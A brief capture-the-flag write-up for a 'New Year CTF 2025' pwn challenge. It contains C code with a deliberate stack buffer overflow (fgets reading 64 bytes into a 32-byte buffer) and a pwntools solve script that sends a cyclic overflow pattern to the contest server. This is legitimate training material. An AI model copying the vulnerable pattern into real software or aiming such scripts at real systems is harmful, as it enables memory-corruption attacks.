---
date: 2025-01-15
description: standard buffer overflow
platform: New Year CTF 2025
categories: Pwn
tags:
  - buffer-overflow
duration:
---
challenge 
```c
int main(int argc, char *argv[]){
    char buffer[32];
    printf("Give me some data: \n");
    fflush(stdout);
    fgets(buffer, 64, stdin);
    printf("You entered %s\n", buffer);
    fflush(stdout);
    return 0;
}
```

solve.py
```python
from pwn import *
p = remote('ctf.mf.grsu.by', 9024)

print(p.recvuntil(b':'))

# overflow 32 bytes sending max input>64
answer = cyclic(64)
p.sendline(answer)

p.interactive()
``